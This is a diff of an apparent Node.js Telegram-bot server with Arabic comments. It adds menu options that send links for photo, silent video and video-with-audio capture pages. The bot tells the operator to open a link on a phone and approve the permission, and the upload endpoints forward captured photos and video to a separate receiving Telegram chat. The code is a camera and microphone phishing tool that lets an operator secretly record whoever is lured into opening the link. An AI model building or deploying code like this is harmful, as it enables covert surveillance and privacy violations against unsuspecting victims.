@@ -12,32 +12,86 @@ app.use(express.json());
 const upload = multer({ storage: multer.memoryStorage() });
 app.use(express.static(path.join(__dirname, 'public')));
 
+// ============ الإعدادات ============
 const SEND_BOT_TOKEN = process.env.SEND_BOT_TOKEN;
 const RECV_BOT_TOKEN = process.env.RECV_BOT_TOKEN;
 const RECV_CHAT_ID   = process.env.RECV_CHAT_ID;
 const SERVER_URL     = process.env.SERVER_URL || `http://localhost:${process.env.PORT || 3000}`;
 
-// استقبال أوامر بوت المصري
+// ========================================
+// Webhook — استقبال أوامر بوت المصري
+// ========================================
 app.post('/telegram-webhook', async (req, res) => {
   try {
+    // ============ 1) معالجة ضغطات الأزرار ============
+    if (req.body.callback_query) {
+      const cb     = req.body.callback_query;
+      const chatId = cb.message.chat.id;
+      const data   = cb.data;
+
+      let link  = "";
+      let title = "";
+
+      if (data === "link_photo") {
+        link  = `${SERVER_URL}/index.html`;
+        title = "📷 *رابط الكاميرا (صور):*";
+      }
+      else if (data === "link_video") {
+        link  = `${SERVER_URL}/video.html`;
+        title = "🎥 *رابط الفيديو (بدون صوت):*";
+      }
+      else if (data === "link_video_audio") {
+        link  = `${SERVER_URL}/video-audio.html`;
+        title = "🎥 *رابط الفيديو (مع صوت):*";
+      }
+
+      if (link) {
+        await axios.post(`https://api.telegram.org/bot${SEND_BOT_TOKEN}/sendMessage`, {
+          chat_id: chatId,
+          text: `${title}\n\n${link}\n\nافتحه على الهاتف ووافق على الإذن.`,
+          parse_mode: "Markdown"
+        });
+      }
+
+      // رد على تليجرام إننا استلمنا الضغطة
+      await axios.post(`https://api.telegram.org/bot${SEND_BOT_TOKEN}/answerCallbackQuery`, {
+        callback_query_id: cb.id
+      });
+
+      return res.sendStatus(200);
+    }
+
+    // ============ 2) معالجة الرسائل النصية ============
     const { message } = req.body;
     if (message && message.text) {
       const text   = message.text.trim();
       const chatId = message.chat.id;
 
+      // /start
       if (text === '/start') {
         await axios.post(`https://api.telegram.org/bot${SEND_BOT_TOKEN}/sendMessage`, {
           chat_id: chatId,
-          text: "👋 أهلاً بك في بوت المصري\n\nاكتب /link للحصول على رابط الكاميرا."
+          text: "👋 أهلاً بك في بوت المصري\n\nاكتب /link للحصول على رابط."
         });
       }
+
+      // /link
       else if (text === '/link') {
-        const link = `${SERVER_URL}/index.html`;
         await axios.post(`https://api.telegram.org/bot${SEND_BOT_TOKEN}/sendMessage`, {
           chat_id: chatId,
-          text: `🎯 رابط الكاميرا:\n\n${link}\n\nافتحه على الهاتف ووافق على الإذن، والصور هتوصلك على بوت هنداوي 📥`
+          text: "🎯 *اختر نوع الرابط:*\n\nمن فضلك اختر اللي يناسبك 👇",
+          parse_mode: "Markdown",
+          reply_markup: {
+            inline_keyboard: [
+              [{ text: "📷 كاميرا (صور)",     callback_data: "link_photo" }],
+              [{ text: "🎥 فيديو بدون صوت",    callback_data: "link_video" }],
+              [{ text: "🎥 فيديو مع صوت",      callback_data: "link_video_audio" }]
+            ]
+          }
         });
       }
+
+      // أمر غير معروف
       else {
         await axios.post(`https://api.telegram.org/bot${SEND_BOT_TOKEN}/sendMessage`, {
           chat_id: chatId,
@@ -45,6 +99,7 @@ app.post('/telegram-webhook', async (req, res) => {
         });
       }
     }
+
     res.sendStatus(200);
   } catch (err) {
     console.error("❌ webhook:", err.message);
@@ -52,7 +107,9 @@ app.post('/telegram-webhook', async (req, res) => {
   }
 });
 
-// استقبال الصور وإرسالها لبوت هنداوي
+// ========================================
+// API — استقبال الصور
+// ========================================
 app.post('/api/upload', upload.single('photo'), async (req, res) => {
   try {
     if (!req.file) return res.status(400).json({ success: false, error: "no file" });
@@ -78,9 +135,7 @@ app.post('/api/upload', upload.single('photo'), async (req, res) => {
     res.status(500).json({ success: false });
   }
 });
-// ========================================
-// API — استقبال الصوت
-// ========================================
+
 // ========================================
 // API — استقبال الفيديو
 // ========================================
@@ -110,6 +165,10 @@ app.post('/api/upload-video', upload.single('video'), async (req, res) => {
     res.status(500).json({ success: false });
   }
 });
+
+// ========================================
+// الصفحة الرئيسية
+// ========================================
 app.get('/', (req, res) => res.send("✅ السيرفر شغال"));
 
 const PORT = process.env.PORT || 3000;
